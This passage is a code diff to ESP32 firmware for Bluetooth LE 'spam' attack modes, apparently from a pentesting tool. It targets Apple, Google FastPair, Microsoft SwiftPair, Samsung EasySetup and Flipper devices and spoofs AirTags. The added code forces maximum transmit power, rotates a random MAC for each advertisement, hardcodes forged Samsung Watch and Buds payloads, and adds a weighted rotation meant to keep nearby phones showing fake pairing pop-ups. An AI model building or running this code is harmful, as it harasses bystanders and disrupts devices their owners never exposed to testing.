       {0x12, "Sapphire Watch5 44mm"},
+      {0x13, "Purpleish Watch5 40mm"},
       {0x14, "Gold Watch5 40mm"},
       {0x15, "Black Watch5 Pro 45mm"},
       {0x16, "Gray Watch5 Pro 45mm"},
       {0x17, "White Watch5 44mm"},
+      {0x18, "White & Black Watch5"},
       {0x1B, "Black Watch6 Pink 40mm"},
       {0x1C, "Gold Watch6 Gold 40mm"},
       {0x1D, "Silver Watch6 Cyan 44mm"},
@@ -2354,7 +2554,7 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color) {
       RunSourApple(scan_mode, color);
     #endif
   }
-  else if ((scan_mode == BT_ATTACK_SWIFTPAIR_SPAM) || 
+  else if ((scan_mode == BT_ATTACK_SWIFTPAIR_SPAM) ||
            (scan_mode == BT_ATTACK_SPAM_ALL) ||
            (scan_mode == BT_ATTACK_SAMSUNG_SPAM) ||
            (scan_mode == BT_ATTACK_GOOGLE_SPAM) ||
@@ -3110,7 +3310,7 @@ String WiFiScan::security_int_to_string(int security_type) {
       authtype = "[WPA3_PSK]";
       break;
 
-    #ifdef HAS_IDF_3
+    #if defined(HAS_IDF_3) && defined(WIFI_AUTH_WPA3_ENTERPRISE)
     case WIFI_AUTH_WPA3_ENTERPRISE:
       authtype = "[WPA3]";
       break;
@@ -4582,64 +4782,42 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
 
-    if (type == Apple2) {
-      this->setBaseMacAddress(macAddr);
-      NimBLEDevice::init("");
-      NimBLEServer *pServer = NimBLEDevice::createServer();
+    if (type == Apple2 || type == Apple || type == Microsoft || type == Google || type == FlipperZero) {
+      // Simondankelmann-parity: rotate MAC per ad via NimBLE setOwnAddr(), burst multiple payloads per call.
+      EBLEPayloadType ad_type = (type == Apple2) ? Apple : type;
 
-      pAdvertising = pServer->getAdvertising();
-
-      delay(10);
-
-      NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
-      pAdvertising->setAdvertisementData(advertisementData);
-
-      #ifdef HAS_NIMBLE_2
-        pAdvertising->setConnectableMode((random(2) == 0) ? BLE_GAP_CONN_MODE_NON : BLE_GAP_CONN_MODE_UND);
-        pAdvertising->setDiscoverableMode(random(3));
-        pAdvertising->setMinInterval(0x20);
-        pAdvertising->setMaxInterval(0x20);
-        pAdvertising->setPreferredParams(0x20, 0x20);
-      #else
-        pAdvertising->setMaxInterval(0x20);
-        pAdvertising->setMinInterval(0x20);
-        pAdvertising->setMinPreferred(0x20);
-        pAdvertising->setMaxPreferred(0x20);
-      #endif
-
-      pAdvertising->start();
-      delay(500);
-      pAdvertising->stop();
-
-      delay(10);
-
-      NimBLEDevice::deinit();
-    }
-    else if (type == Apple) {
-      if ((now_time - this->last_sour_apple_update > 1000) || (this->last_sour_apple_update == 0) || (!this->ble_initialized)) {
-        this->setBaseMacAddress(macAddr);
-
+      if (!this->ble_initialized) {
+        uint8_t smac[6];
+        generateRandomMac(smac);
+        esp_base_mac_addr_set(smac);
         NimBLEDevice::init("");
+        // Force MAX TX power on every BLE power slot (default + adv + scan).
+        // setPower(dbm) alone only covers the "default" type; advertising uses a separate power slot
+        // in the ESP32 BT controller. Cover all of them so the radio actually transmits at +9 dBm.
+        NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_DEFAULT);
+        NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_ADV);
+        NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_SCAN);
+        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);  // belt & suspenders via raw IDF API
+        NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
         NimBLEServer *pServer = NimBLEDevice::createServer();
-
         pAdvertising = pServer->getAdvertising();
-
-        delay(40);
-
-        NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
-        pAdvertising->setAdvertisementData(advertisementData);
-
+        pAdvertising->setMinInterval(0x20);
+        pAdvertising->setMaxInterval(0x20);
+        pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
         this->ble_initialized = true;
       }
 
-      pAdvertising->start();
-      delay(60);
-      pAdvertising->stop();
+      for (uint8_t n = 0; n < 6; n++) {
+        uint8_t rmac[6];
+        generateRandomMac(rmac);
+        rmac[5] |= 0xC0;  // random static address
+        NimBLEDevice::setOwnAddr(rmac);
 
-      if ((now_time - this->last_sour_apple_update > 1000) || (this->last_sour_apple_update == 0)) {
-        this->last_sour_apple_update = now_time;
-        NimBLEDevice::deinit();
-        this->ble_initialized = false;
+        NimBLEAdvertisementData ad = this->GetUniversalAdvertisementData(ad_type);
+        pAdvertising->setAdvertisementData(ad);
+        pAdvertising->start();
+        delay(40);
+        pAdvertising->stop();
       }
     }
     else if (type == Airtag) {
@@ -4675,25 +4853,133 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
         }
       }
     }
+    else if (type == Samsung) {
+      // Simondankelmann-parity: rotate MAC per model via NimBLE setOwnAddr()
+      // so every advertisement goes out with a unique (MAC, model_id) pair.
+      // Emits both EasySetup Watch (26 variants) and EasySetup Buds (20 variants).
+      static uint8_t s_samsung_watch_cursor = 0;
+      static uint8_t s_samsung_buds_cursor = 0;
+      static uint32_t s_samsung_calls = 0;
+      s_samsung_calls++;
+
+      // Samsung EasySetup Buds device IDs (3 bytes each) from simondankelmann/Bluetooth-LE-Spam
+      static const uint8_t buds_models[20][3] = {
+        {0xEE,0x7A,0x0C}, {0x9D,0x17,0x00}, {0x39,0xEA,0x48}, {0xA7,0xC6,0x2C},
+        {0x85,0x01,0x16}, {0x3D,0x8F,0x41}, {0x3B,0x6D,0x02}, {0xAE,0x06,0x3C},
+        {0xB8,0xB9,0x05}, {0xEA,0xAA,0x17}, {0xD3,0x07,0x04}, {0x9D,0xB0,0x06},
+        {0x10,0x1F,0x1A}, {0x85,0x96,0x08}, {0x8E,0x45,0x03}, {0x2C,0x67,0x40},
+        {0x3F,0x67,0x18}, {0x42,0xC5,0x19}, {0xAE,0x07,0x3A}, {0x01,0x17,0x16}
+      };
+
+      if (!this->ble_initialized) {
+        uint8_t smac[6];
+        generateRandomMac(smac);
+        esp_base_mac_addr_set(smac);
+        NimBLEDevice::init("");
+        NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_DEFAULT);
+        NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_ADV);
+        NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_SCAN);
+        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+        NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
+        NimBLEServer *pServer = NimBLEDevice::createServer();
+        pAdvertising = pServer->getAdvertising();
+        pAdvertising->setMinInterval(0x20);
+        pAdvertising->setMaxInterval(0x20);
+        pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
+        this->ble_initialized = true;
+        Serial.println("[SSpam] init once (watch+buds)");
+      }
+
+      // Buds scan response: Samsung zeros, 14 bytes after company ID (simondankelmann parity)
+      static const uint8_t buds_sr[18] = {
+        0x11, 0xFF, 0x75, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+      };
+
+      // Burst 6 ads per call: 3 watches + 3 buds, alternating
+      for (uint8_t n = 0; n < 6; n++) {
+        uint8_t rmac[6];
+        generateRandomMac(rmac);
+        rmac[5] |= 0xC0;
+        NimBLEDevice::setOwnAddr(rmac);
+
+        NimBLEAdvertisementData sd;
+        NimBLEAdvertisementData ad;
+
+        if ((n & 1) == 0) {
+          // --- EasySetup Watch (15-byte AdvData, no scan response) ---
+          uint8_t idx = s_samsung_watch_cursor;
+          s_samsung_watch_cursor = (s_samsung_watch_cursor + 1) % 26;
+          uint8_t model_val = watch_models[idx].value;
+
+          uint8_t raw[15];
+          uint8_t p = 0;
+          raw[p++] = 14;
+          raw[p++] = 0xFF;
+          raw[p++] = 0x75; raw[p++] = 0x00;
+          raw[p++] = 0x01; raw[p++] = 0x00;
+          raw[p++] = 0x02; raw[p++] = 0x00;
+          raw[p++] = 0x01; raw[p++] = 0x01;
+          raw[p++] = 0xFF;
+          raw[p++] = 0x00; raw[p++] = 0x00;
+          raw[p++] = 0x43;
+          raw[p++] = model_val;
+
+          // Empty scan response to clear Buds SR from previous iteration
+          pAdvertising->setScanResponseData(sd);
+          #ifndef HAS_NIMBLE_2
+            ad.addData(std::string((char *)raw, 15));
+          #else
+            ad.addData(raw, 15);
+          #endif
+
+          if ((s_samsung_calls == 1) && n < 2)
+            Serial.printf("[SSpam] WATCH n=%u idx=%u mv=0x%02X\n", n, idx, model_val);
+        } else {
+          // --- EasySetup Buds (28-byte AdvData + scan response) ---
+          uint8_t idx = s_samsung_buds_cursor;
+          s_samsung_buds_cursor = (s_samsung_buds_cursor + 1) % 20;
+          const uint8_t *id = buds_models[idx];
+
+          uint8_t raw[28];
+          uint8_t p = 0;
+          raw[p++] = 27;
+          raw[p++] = 0xFF;
+          raw[p++] = 0x75; raw[p++] = 0x00;
+          raw[p++] = 0x42; raw[p++] = 0x09; raw[p++] = 0x81; raw[p++] = 0x02; raw[p++] = 0x14;
+          raw[p++] = 0x15; raw[p++] = 0x03; raw[p++] = 0x21; raw[p++] = 0x01; raw[p++] = 0x09;
+          raw[p++] = id[0]; raw[p++] = id[1]; raw[p++] = 0x01; raw[p++] = id[2];
+          raw[p++] = 0x06; raw[p++] = 0x3C; raw[p++] = 0x94; raw[p++] = 0x8E; raw[p++] = 0x00;
+          raw[p++] = 0x00; raw[p++] = 0x00; raw[p++] = 0x00; raw[p++] = 0xC7; raw[p++] = 0x00;
+
+          // Scan response must be set before advertisement data
+          #ifndef HAS_NIMBLE_2
+            sd.addData(std::string((char *)buds_sr, 18));
+          #else
+            sd.addData(buds_sr, 18);
+          #endif
+          pAdvertising->setScanResponseData(sd);
+          #ifndef HAS_NIMBLE_2
+            ad.addData(std::string((char *)raw, 28));
+          #else
+            ad.addData(raw, 28);
+          #endif
+
+          if ((s_samsung_calls == 1) && n < 3)
+            Serial.printf("[SSpam] BUDS  n=%u idx=%u id=%02X%02X%02X\n", n, idx, id[0], id[1], id[2]);
+        }
+
+        pAdvertising->setAdvertisementData(ad);
+        pAdvertising->start();
+        delay(40);
+        pAdvertising->stop();
+      }
+    }
     else if ((type == Microsoft) ||
              (type == Google) ||
-             (type == Samsung) ||
              (type == FlipperZero)) {
-      this->setBaseMacAddress(macAddr);
-
-      NimBLEDevice::init("");
-
-      NimBLEServer *pServer = NimBLEDevice::createServer();
-
-      pAdvertising = pServer->getAdvertising();
-
-      NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(type);
-      pAdvertising->setAdvertisementData(advertisementData);
-      pAdvertising->start();
-      delay(10);
-      pAdvertising->stop();
-
-      NimBLEDevice::deinit();
+      // Handled by the unified branch above.
     }
   #endif
 }
@@ -10232,32 +10518,58 @@ void WiFiScan::main(uint32_t currentTime)
         #endif
       }
 
-      if ((currentScanMode == BT_ATTACK_GOOGLE_SPAM) ||
-          (currentScanMode == BT_ATTACK_SPAM_ALL))
-        this->executeBLESpam(Google);
+      if (currentScanMode == BT_ATTACK_SPAM_ALL) {
+        // Kitchen Sink: rotate one payload type per tick instead of blasting all
+        // 6 types back-to-back. On mixed-vendor targets (e.g. Motorola only
+        // consumes FastPair), packing all 6 types into every tick causes the
+        // target's BLE scanner to dedupe/drop the single relevant type.
+        // Giving each type dedicated airtime per tick fixes the "only 1
+        // notification" behavior.
+        //
+        // Weighted rotation (10 slots, ~15s per full cycle):
+        //   Apple/Apple2 = 4/10  (covers most consumer devices: iPhone/iPad/Mac)
+        //   Google       = 3/10  (covers Android via FastPair)
+        //   Samsung/Microsoft/FlipperZero = 1/10 each
+        static uint8_t sink_cursor = 0;
+        const EBLEPayloadType sink_cycle[] = {
+          Apple, Google, Apple2, Samsung,
+          Apple, Google, Apple2, Microsoft,
+          Google, FlipperZero
+        };
+        const char* sink_names[] = {
+          "Apple", "Google", "Apple2", "Samsung",
+          "Apple", "Google", "Apple2", "Microsoft",
+          "Google", "FlipperZero"
+        };
+        const uint8_t sink_len = sizeof(sink_cycle) / sizeof(sink_cycle[0]);
+        EBLEPayloadType t = sink_cycle[sink_cursor];
+        Serial.printf("[SINK] slot=%u/%u -> %s\n",
+                      sink_cursor, sink_len, sink_names[sink_cursor]);
+        this->executeBLESpam(t);
+        sink_cursor = (sink_cursor + 1) % sink_len;
+      }
+      else {
+        if (currentScanMode == BT_ATTACK_GOOGLE_SPAM)
+          this->executeBLESpam(Google);
 
-      if ((currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
-          (currentScanMode == BT_ATTACK_SPAM_ALL))
-        this->executeBLESpam(Samsung);
+        if (currentScanMode == BT_ATTACK_SAMSUNG_SPAM)
+          this->executeBLESpam(Samsung);
 
-      if ((currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
-          (currentScanMode == BT_ATTACK_SPAM_ALL))
-        this->executeBLESpam(Microsoft);
+        if (currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM)
+          this->executeBLESpam(Microsoft);
 
-      if ((currentScanMode == BT_ATTACK_SOUR_APPLE) ||
-          (currentScanMode == BT_ATTACK_SPAM_ALL))
-        this->executeBLESpam(Apple);
+        if (currentScanMode == BT_ATTACK_SOUR_APPLE)
+          this->executeBLESpam(Apple);
 
-      if ((currentScanMode == BT_ATTACK_APPLE_JUICE) ||
-          (currentScanMode == BT_ATTACK_SPAM_ALL))
-        this->executeBLESpam(Apple2);
+        if (currentScanMode == BT_ATTACK_APPLE_JUICE)
+          this->executeBLESpam(Apple2);
 
-      if ((currentScanMode == BT_ATTACK_FLIPPER_SPAM) ||
-          (currentScanMode == BT_ATTACK_SPAM_ALL))
-        this->executeBLESpam(FlipperZero);
-      
-      if (currentScanMode == BT_SPOOF_AIRTAG)
-        this->executeBLESpam(Airtag);
+        if (currentScanMode == BT_ATTACK_FLIPPER_SPAM)
+          this->executeBLESpam(FlipperZero);
+
+        if (currentScanMode == BT_SPOOF_AIRTAG)
+          this->executeBLESpam(Airtag);
+      }
 
     #endif
   }
